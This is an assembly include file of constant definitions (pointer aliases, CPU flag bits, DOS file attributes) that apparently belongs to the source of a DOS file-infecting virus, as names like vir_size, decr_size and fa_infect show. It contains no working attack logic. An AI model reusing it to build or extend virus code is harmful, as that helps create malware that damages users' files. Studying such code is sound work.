   ; - -[#EQU.INC] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

   in_ID           equ     'ð*'
   out_ID          equ     '’Œ'

   v_size          equ     decr_size + (vir_size + stamms_max_ip) * 8

   b0              equ     (byte ptr 0)
   b1              equ     (byte ptr 1)
   b2              equ     (byte ptr 2)
   b3              equ     (byte ptr 3)

   w0              equ     (word ptr 0)
   w1              equ     (word ptr 1)
   w2              equ     (word ptr 2)
   w3              equ     (word ptr 3)

   l               equ     w0
   h               equ     w2

   offs            equ     w0
   segm            equ     w2

                   ; flags

   fl_CF           equ     0001h
   fl_PF           equ     0004h
   fl_AF           equ     0010h
   fl_ZF           equ     0040h
   fl_SF           equ     0080h
   fl_TF           equ     0100h
   fl_IF           equ     0200h
   fl_OF           equ     0800h

                   ; dos file attributes

   fa_readonly     equ     01h
   fa_hidden       equ     02h
   fa_system       equ     04h
   fa_volumeid     equ     08h
   fa_directory    equ     10h
   fa_archive      equ     20h

   fa_infect       equ     fa_readonly + fa_hidden + fa_system + fa_archive
